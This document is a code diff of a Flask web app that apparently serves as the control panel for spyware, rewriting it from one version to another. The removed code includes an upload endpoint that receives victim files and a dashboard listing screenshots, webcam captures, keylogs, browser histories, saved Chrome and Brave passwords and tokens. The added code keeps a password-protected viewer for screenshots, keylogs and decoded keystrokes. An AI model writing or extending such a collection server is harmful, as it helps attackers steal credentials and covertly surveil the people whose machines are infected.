@@ -1,132 +1,161 @@
+from flask import Flask, render_template_string, request, send_from_directory, abort
 import os
-from flask import Flask, request, send_from_directory, render_template_string
-from werkzeug.utils import secure_filename
-from datetime import datetime
-import pytz
-
-UPLOAD_ROOT = "logs"
-PASSWORD = "disha456"
 
 app = Flask(__name__)
-os.makedirs(UPLOAD_ROOT, exist_ok=True)
 
-COLUMNS = [
-    "Hostname", "Timestamp", "Desktop Screenshot", "Webcam", "Keylogs",
-    "Decoded Keylogs", "Chrome History", "Brave History", "Chrome Passwords",
-    "Brave Passwords", "Tokens", "Recent Files", "File Access Log"
-]
+# Set the folder where logs are saved
+LOG_FOLDER = "logs"
 
+# HTML template
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html>
 <head>
-  <title>System Log Monitor</title>
-  <style>
-    body { background-color: black; color: lime; font-family: monospace; }
-    h2 { color: cyan; }
-    table { border-collapse: collapse; width: 100%; margin-top: 20px; }
-    th, td { border: 1px solid lime; padding: 8px; text-align: center; }
-    th { font-size: 18px; font-weight: bold; background: #222; }
-    td a { color: cyan; text-decoration: none; }
-    form { margin-top: 30px; }
-    input[type=password] { background: black; color: lime; border: 1px solid lime; padding: 5px; }
-  </style>
+    <title>Monitoring Dashboard</title>
+    <style>
+        body {
+            background-color: #0f0f0f;
+            color: #00ff00;
+            font-family: monospace;
+            padding: 20px;
+        }
+        table {
+            border-collapse: collapse;
+            width: 100%;
+            margin-top: 30px;
+        }
+        th, td {
+            border: 1px solid #00ff00;
+            padding: 8px;
+            text-align: left;
+            max-width: 200px;
+            word-wrap: break-word;
+        }
+        th {
+            background-color: #1f1f1f;
+        }
+        a {
+            color: #00ffff;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
 </head>
 <body>
-  {% if not authed %}
-    <h2>Enter Password to Access Logs</h2>
+    <h1>🕵️ Hacker-Themed Log Viewer</h1>
     <form method="POST">
-      <input type="password" name="password" placeholder="Enter password"/>
-      <button type="submit">Login</button>
+        <label>Password:</label>
+        <input type="password" name="password">
+        <input type="submit" value="Access">
     </form>
-  {% else %}
-    <center><h2>Log Viewer (Live Feed)</h2></center>
-    <table>
-      <tr>
-        {% for col in columns %}
-          <th>{{ col }}</th>
-        {% endfor %}
-      </tr>
-      {% for folder in logs %}
-        <tr>
-          <td>{{ folder.hostname }}</td>
-          <td>{{ folder.timestamp }}</td>
-          {% for file in folder.files %}
-            <td>{% if file %}<a href="{{ file }}">📥 View/Download</a>{% else %}-{% endif %}</td>
-          {% endfor %}
-        </tr>
-      {% endfor %}
-    </table>
-  {% endif %}
+
+    {% if authenticated %}
+        <table>
+            <tr>
+                <th>Timestamp</th>
+                <th>Screenshots</th>
+                <th>Keylogs</th>
+                <th>System Info</th>
+                <th>Performance</th>
+                <th>Decoded Keylogs</th>
+            </tr>
+            {% for row in data %}
+            <tr>
+                <td>{{ row['timestamp'] }}</td>
+                <td><a href="/logs/{{ row['screenshot'] }}" target="_blank">{{ row['screenshot'] }}</a></td>
+                <td><a href="/logs/{{ row['keylog'] }}" target="_blank">{{ row['keylog'] }}</a></td>
+                <td><a href="/logs/{{ row['system'] }}" target="_blank">{{ row['system'] }}</a></td>
+                <td><a href="/logs/{{ row['performance'] }}" target="_blank">{{ row['performance'] }}</a></td>
+                <td>
+                    {% if row['decoded'] %}
+                        <a href="/view_decoded/{{ row['decoded'] }}" target="_blank">{{ row['decoded'] }}</a>
+                    {% else %}
+                        No decoded keylog
+                    {% endif %}
+                </td>
+            </tr>
+            {% endfor %}
+        </table>
+    {% endif %}
 </body>
 </html>
 '''
 
-@app.route("/", methods=["GET", "POST"])
+@app.route('/', methods=['GET', 'POST'])
 def index():
-    authed = False
-    if request.method == "POST":
-        if request.form.get("password") == PASSWORD:
-            authed = True
-    elif request.args.get("access") == PASSWORD:
-        authed = True
+    authenticated = False
+    data = []
 
-    log_entries = []
-    if authed:
-        for folder in sorted(os.listdir(UPLOAD_ROOT), reverse=True):
-            full_path = os.path.join(UPLOAD_ROOT, folder)
-            if os.path.isdir(full_path):
-                # Convert folder name timestamp to IST format
-                try:
-                    dt = datetime.strptime(folder, "%Y-%m-%d_%H-%M-%S")
-                    utc = pytz.utc.localize(dt)
-                    ist = utc.astimezone(pytz.timezone('Asia/Kolkata'))
-                    formatted_timestamp = ist.strftime("%H:%M:%S__%d:%m:%Y")
-                except:
-                    formatted_timestamp = folder
+    if request.method == 'POST':
+        if request.form.get('password') == 'disha456':
+            authenticated = True
 
-                row = {"hostname": "", "timestamp": formatted_timestamp, "files": []}
+            # Read all folders inside logs/
+            for folder in sorted(os.listdir(LOG_FOLDER), reverse=True):
+                folder_path = os.path.join(LOG_FOLDER, folder)
+                if os.path.isdir(folder_path):
+                    files = os.listdir(folder_path)
+                    row = {
+                        'timestamp': folder,
+                        'screenshot': next((f for f in files if 'screenshot' in f), ''),
+                        'keylog': next((f for f in files if 'keylogs_export' in f), ''),
+                        'system': next((f for f in files if 'system_info' in f), ''),
+                        'performance': next((f for f in files if 'performance' in f), ''),
+                        'decoded': next((f for f in files if 'decoded_keylogs' in f), ''),
+                    }
+                    data.append(row)
 
-                for col in COLUMNS[2:]:
-                    matched = False
-                    for f in os.listdir(full_path):
-                        normalized = col.lower().replace(" ", "_")
-                        if normalized in f.lower():
-                            file_path = os.path.join(full_path, f)
-                            row["files"].append(f"/download/{folder}/{f}")
-                            matched = True
-                            break
-                    if not matched:
-                        row["files"].append(None)
+    return render_template_string(HTML_TEMPLATE, authenticated=authenticated, data=data)
 
-                # Extract hostname from activity_log.txt
-                activity_log_file = next((f for f in os.listdir(full_path) if "activity_log" in f.lower()), None)
-                if activity_log_file:
-                    try:
-                        with open(os.path.join(full_path, activity_log_file), "r", encoding="utf-8") as f:
-                            for line in f:
-                                if "Computer Name:" in line:
-                                    row["hostname"] = line.split(":", 1)[1].strip()
-                                    break
-                    except:
-                        row["hostname"] = "Unknown"
+@app.route('/logs/<path:filename>')
+def download_file(filename):
+    try:
+        # Allow opening any log file
+        parts = filename.split('/')
+        if len(parts) != 2:
+            abort(404)
+        folder, file = parts
+        return send_from_directory(os.path.join(LOG_FOLDER, folder), file)
+    except:
+        abort(404)
 
-                if not row["hostname"]:
-                    row["hostname"] = folder.split("_")[0]
-                log_entries.append(row)
+@app.route('/view_decoded/<path:filename>')
+def view_decoded(filename):
+    try:
+        parts = filename.split('/')
+        if len(parts) != 2:
+            abort(404)
+        folder, file = parts
+        file_path = os.path.join(LOG_FOLDER, folder, file)
+        if not os.path.exists(file_path):
+            abort(404)
 
-    return render_template_string(HTML_TEMPLATE, authed=authed, columns=COLUMNS, logs=log_entries)
+        with open(file_path, 'r', encoding='utf-8') as f:
+            content = f.read().replace('<', '&lt;').replace('>', '&gt;').replace('\n', '<br>')
 
-@app.route("/api/receive", methods=["POST"])
-def receive():
-    folder_name = datetime.utcnow().strftime("%Y-%m-%d_%H-%M-%S")
-    save_dir = os.path.join(UPLOAD_ROOT, folder_name)
-    os.makedirs(save_dir, exist_ok=True)
-    for f in request.files.values():
-        filename = secure_filename(f.filename)
-        f.save(os.path.join(save_dir, filename))
-    return "Logs received"
+        return f'''
+        <html>
+            <head>
+                <title>{filename}</title>
+                <style>
+                    body {{
+                        background-color: #000;
+                        color: #00ff00;
+                        font-family: monospace;
+                        padding: 20px;
+                    }}
+                </style>
+            </head>
+            <body>
+                <h2>Decoded Keylog: {filename}</h2>
+                <p>{content}</p>
+            </body>
+        </html>
+        '''
+    except Exception as e:
+        return f"Error: {str(e)}", 500
 
-@app.route("/download/<folder>/<filename>")
-def download(folder, filename):
-    return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename)
+if __name__ == '__main__':
+    app.run(debug=True)
